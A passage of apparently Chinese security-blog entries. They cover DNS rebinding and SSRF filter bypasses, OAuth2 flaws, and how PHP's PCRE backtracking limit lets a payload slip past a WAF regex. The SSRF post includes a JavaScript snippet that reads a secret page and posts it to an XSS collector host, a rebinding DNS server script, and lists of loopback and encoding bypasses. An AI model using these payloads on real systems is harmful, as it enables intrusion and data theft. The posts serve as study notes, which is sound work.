class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>();</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">url</span>:<span class="string">&quot;http://www.x.com/secret&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">type</span>:<span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">post</span>(<span class="string">&quot;http://xss平台&quot;</span>,&#123;<span class="string">&#x27;a&#x27;</span>:data&#125;)&#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>整个过程如下：</p>
<ol>
<li>你提交的是<code>www.x.com/index.php</code>，内容如上述代码</li>
<li>设置你的域名的TTL&#x3D;0，提交之后服务器会请求dns的域名与ip的关系然后找到你的这个页面，然后开始执行js。</li>
<li>执行的时候先延迟90s，利用这延迟的90s，去修改你域名的A记录绑定到127.0.0.1上</li>
<li>然后js延迟结束之后之后又会请求<code>http://www.x.com/secret</code>，由于你之前设置的TTL&#x3D;0，所以又会重新向dns服务器请求一次ip。得到ip&#x3D;127.0.0.1，而整个过程访问的都是同一域名，所以浏览器认为是安全的。就会成功去访问<code>http://127.0.0.1/secret</code>，从而绕过同源策略</li>
</ol>
<h3 id="1-2-两条A记录"><a href="#1-2-两条A记录" class="headerlink" title="1.2 两条A记录"></a>1.2 两条A记录</h3><p>域名解析配置2条A记录，一条为外网的VPS IP，一条为内网IP，就<a class="link"   href="http://www.bendawang.site/2017/01/05/33c3-CTF-web-WriteUp/" >33c3-CTF list0r<i class="fas fa-external-link-alt"></i></a>这题而言，服务器会向DNS服务器连续访问2次请求，第一次判断解析后的IP是否在黑名单IP(本地IP)中，第二次就直接访问域名，所以需要第一次解析为外网地址，第二次解析为127.0.0.1，这种情况就可以采用此方法。DNS服务器绑定2条记录的解析是随机的，所以成功率只有1&#x2F;4。</p>
<img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/586e317cb6a56d3762000002.png" class="" title="img">

<p>这种方法推荐使用<a class="link"   href="http://ceye.io/dns-rebinding" >ceye.io<i class="fas fa-external-link-alt"></i></a>创建，在个人信息页新增DNS解析IP就可以</p>
<img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/image-20220319192958158.png" class="" title="image-20220319192958158">

<p>多nslookup下自己<code>abcdef.ceye.io</code>的子域名，比如如<code>nslookup r.abcdef.ceye.io</code></p>
<img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/image-20220319193310416.png" class="" title="image-20220319193310416">



<h3 id="1-3-NS记录-自建DNS服务器"><a href="#1-3-NS记录-自建DNS服务器" class="headerlink" title="1.3 NS记录+自建DNS服务器"></a>1.3 NS记录+自建DNS服务器</h3><p>此方法需要再我们DNS解析配置一条NS记录和一条A记录</p>
<img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/image-20220112161403319.png" class="" title="image-20220112161403319">

<p>ns记录表示域名<code>test.p0melo.top</code>这个子域名指定由<code>ns.p0melo.top</code>这个域名服务器来解析，然后a记录表示我的这个<code>ns.p0melo.top</code>的位置在ip地址<code>149.248.18.38</code>上。然后我们用python的twisted库搭建一个DNS服务器就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DynamicResolver</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_doDynamicResponse</span>(<span class="params">self, query</span>):</span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">&quot;149.248.18.38&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> name+<span class="string">&quot; ===&gt; &quot;</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            <span class="built_in">type</span>=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b&#x27;%s&#x27;</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">self, query, timeout=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">&#x27;/etc/resolv.conf&#x27;</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>

<p>我们使用<code>nslookup test.p0melo.top</code>查看解析结果，可以看到前后两次DNS解析不同</p>
<img src="/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/image-20220112161740821.png" class="" title="image-20220112161740821">

<h2 id="0x02-其他的SSRF绕过技术"><a href="#0x02-其他的SSRF绕过技术" class="headerlink" title="0x02 其他的SSRF绕过技术"></a>0x02 其他的SSRF绕过技术</h2><p>再说节其他的一些ssrf绕过技术</p>
<h3 id="2-1-符号绕过"><a href="#2-1-符号绕过" class="headerlink" title="2.1 @符号绕过"></a>2.1 @符号绕过</h3><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</p>
<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
<h3 id="2-2-点分隔符替换"><a href="#2-2-点分隔符替换" class="headerlink" title="2.2 点分隔符替换"></a>2.2 点分隔符替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure>

<h3 id="2-3-本地回环地址"><a href="#2-3-本地回环地址" class="headerlink" title="2.3 本地回环地址"></a>2.3 本地回环地址</h3><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1 </span><br><span class="line">http://localhost </span><br><span class="line">http://127.255.255.254 </span><br><span class="line">127.0.0.1 - 127.255.255.254 </span><br><span class="line">http://127.1 </span><br><span class="line">http://127.0.1 </span><br><span class="line">http://0:80</span><br></pre></td></tr></table></figure>

<p>IPV6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[::1] </span><br><span class="line">http://[::ffff:7f00:1] </span><br><span class="line">http://[::ffff:127.0.0.1] </span><br><span class="line">http://ip6-localhost</span><br><span class="line">http://0--1.ipv6-literal.net</span><br></pre></td></tr></table></figure>

<h3 id="2-4-DNS解析"><a href="#2-4-DNS解析" class="headerlink" title="2.4 DNS解析"></a>2.4 DNS解析</h3><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure>

<p>xip.io是一个开源泛域名服务。它会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>

<h3 id="2-5-IP的进制转换"><a href="#2-5-IP的进制转换" class="headerlink" title="2.5 IP的进制转换"></a>2.5 IP的进制转换</h3><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a class="link"   href="https://github.com/vysecurity/IPFuscator" >IPFuscator<i class="fas fa-external-link-alt"></i></a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化。</p>
<h3 id="2-6-封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#2-6-封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="2.6 封闭式字母数字 (Enclosed Alphanumerics)字符"></a>2.6 封闭式字母数字 (Enclosed Alphanumerics)字符</h3><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>

<h3 id="2-7-利用网址缩短"><a href="#2-7-利用网址缩短" class="headerlink" title="2.7 利用网址缩短"></a>2.7 利用网址缩短</h3><p>网上有很多将网址转换未短网址的网站。</p>
<ul>
<li><p><a class="link"   href="https://www.985.so/" >https://www.985.so/<i class="fas fa-external-link-alt"></i></a></p>
</li>
<li><p><a class="link"   href="https://www.urlc.cn/" >https://www.urlc.cn/<i class="fas fa-external-link-alt"></i></a></p>
</li>
</ul>
<h3 id="2-8-利用30X重定向"><a href="#2-8-利用30X重定向" class="headerlink" title="2.8 利用30X重定向"></a>2.8 利用30X重定向</h3><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。</p>
<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p>
<p>服务端代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://192.168.1.10&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a><strong>0x03 参考</strong></h2><p><a class="link"   href="https://mp.weixin.qq.com/s/VvXCTNZhfknKNlcUdMzGBA" >SSRF防御与绕过<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" >关于DNS重绑定总结<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>Oauth2.0安全问题</title>
    <url>/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开局一张图</p>
<img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_g44-RXo8eP.png" class="">

<p>根据自己对Oauth2.0授权码模式的理解简单画了个图，图中包含了Oauth2.0授权码模式的流程和oauth的几个常见的特性漏洞。网上oauth的图很多很多，但是总感觉别人画的始终是别人的理解，不根据自己的理解画一遍都不知道自己哪里不会（菜鸡的感慨~）</p>
<p>接下来挨个简介下标红的三种问题，下面的问题描述都较为简单，主要是作为自己的笔记记录，不做教程性的介绍，若想要看详细的原理介绍，推荐<a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a>的几个好文</p>
<h1 id="1-通过CSRF将攻击者code绑定受害者token"><a href="#1-通过CSRF将攻击者code绑定受害者token" class="headerlink" title="1.通过CSRF将攻击者code绑定受害者token"></a>1.通过CSRF将攻击者code绑定受害者token</h1><p>一句话描述：攻击者通过CSRF漏洞，使已登录的用户把攻击者的CODE拿去授权服务器获取accces_token令牌，攻击者就可以通过accces_token令牌访问被绑定用户的资源服务器</p>
<img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/1652280594235-fb7ff3ed-7d20-41fd-b8c0-4fea1e762a80.png" class="">

<p>防御方法：<strong>在请求授权码时，增加随机state参数（通常是6为字母加数字），在返回授权码的回调接口中验证state参数是否和发送的相同</strong>，这样可以确保授权码和授权请求是由同一个用户发起的</p>
<h1 id="2-URL重定向导致code泄露"><a href="#2-URL重定向导致code泄露" class="headerlink" title="2.URL重定向导致code泄露"></a>2.URL重定向导致code泄露</h1><p>这个漏洞是oauth比较常见且较容易理解的，若授权服务器未校验重定向url或校验不严格，攻击者可构造携带恶意的重定向url给用户授权，例如</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://xxx.com/oauth/authorize?response_type=code&amp;client_id=CLIENT_ID&amp;redirect_uri=http://www.hacker.com</span><br></pre></td></tr></table></figure>

<p>用户授权后的code将发送到恶意的<code>redirect_uri</code>，攻击者即可获得授权码code。</p>
<p>还有一种情况是若授权服务器严格校验<code>redirect_uri</code>为白名单域名，则可以结合白名单域名下可控的静态页面或XSS利用，将<code>redirect_uri</code>设置为白名单域名下静态页面链接或XSS的链接，并在并在链接页面下嵌入类似<code>&lt;img src =&quot;https://clientA.com/catch&quot;&gt;</code>发起跨域请求的代码，攻击者在<code>clientA.com</code>收到的请求Referer头中即可查看到code，攻击步骤如下</p>
<img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_nFhw0WGaWy.png" class="">

<p>并不是所有请求都携带Referer头，利用Referer头请求一般有如下规则</p>
<img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_U2uitWmtbD.png" class="">

<h1 id="3-code未绑定clent-id导致一code多客户端使用"><a href="#3-code未绑定clent-id导致一code多客户端使用" class="headerlink" title="3.code未绑定clent_id导致一code多客户端使用"></a>3.code未绑定clent_id导致一code多客户端使用</h1><p>假设攻击者想要登录“极客时间”的软件B上的用户G，他可在授权服务器注册一个软件A，获得合法的 <code>app_id</code> 和 <code>app_secret</code>，当用户G对软件B进行授权产生了一个授权码 codeB，<strong>如果攻击者获取到了这个codeB，且授权服务器未绑定code与客户端ID时</strong>，攻击者就能通过codeB在软件A上授权，获取到用户G的access_token，从而获取用户G的数据</p>
<p>这一问题通常建立在授权码code失窃的场景下，也就是可以通过上面重定向的漏洞获取code</p>
<img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_7IKdMk8Vab.png" class="">

<p>怎么防御呢？</p>
<ul>
<li><p>授权码需要绑定客户端ID，并在获取access_token时校验授权码是否为绑定的客户端ID；</p>
</li>
<li><p>授权码 code一次失效，code使用过一次之后，授权服务需要删除这个 code；</p>
</li>
</ul>
<h1 id="4-水平越权"><a href="#4-水平越权" class="headerlink" title="4.水平越权"></a>4.水平越权</h1><p>最后这个问题算是资源服务器的问题，没有在开局的图中体现出来，开局的图主要说明的是客户端和授权服务器的流程，所以这个放最后讲下，先看下图</p>
<img src="/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image_oHtFLdiLob.png" class="">

<p>小兔打单软件是授权服务器，可以给多个商家授权，商家就属于客户端，授权服务器生成的access_token返回到客户端的tokenCallback处理（开局图流程的最下方），这里将access_token转化为包括商家ID的用户数据，，假设受保护资源服务有一个通过订单IP查询订单详情的API，若API没有对订单 ID和access_token解出来的商家 ID  做归属判断，那么商家A就能查看到商家B的订单数据</p>
<p>防御方法：资源服务API需要对API操作的数据与access_token解析的权限内容做归属判断</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a class="link"   href="https://zq99299.github.io/note-book/oath2/02/02.html"  title="https://zq99299.github.io/note-book/oath2/02/02.html">https://zq99299.github.io/note-book/oath2/02/02.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.51cto.com/u_13626762/3113777"  title="https://blog.51cto.com/u_13626762/3113777">https://blog.51cto.com/u_13626762&#x2F;3113777<i class="fas fa-external-link-alt"></i></a></p>
<p>[<a class="link"   href="https://www.cnblogs.com/hellowhy/p/15533625.html]" >https://www.cnblogs.com/hellowhy/p/15533625.html]<i class="fas fa-external-link-alt"></i></a>(</p>
]]></content>
  </entry>
  <entry>
    <title>PHP的PCRE库回溯问题</title>
    <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p>
<h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p>
<p>DFA与NFA机制上的不同带来3种主要影响：</p>
<ol>
<li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li>
<li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li>
<li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li>
</ol>
<p><strong>针对第2点，这里举个例子来说明：</strong></p>
<p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p>
<p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; <span class="title function_ invoke__">print_r</span>(<span class="variable">$matches</span>);</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p>
<p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p>
<h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p>
<p>　　量词：{m,n}：m到n个</p>
<p>　　　　　*：任意多个</p>
<p>　　　　　+：一个到多个</p>
<p>　　　　　？：0或一个</p>
<p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932">

<p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139">

<p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050">

<p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722">

<p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726">

<p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p>
<h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure>

<p>当回溯次数大于1000000会有什么问题呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.*?a/s&#x27;</span>,<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>

<p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170">

<p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p>
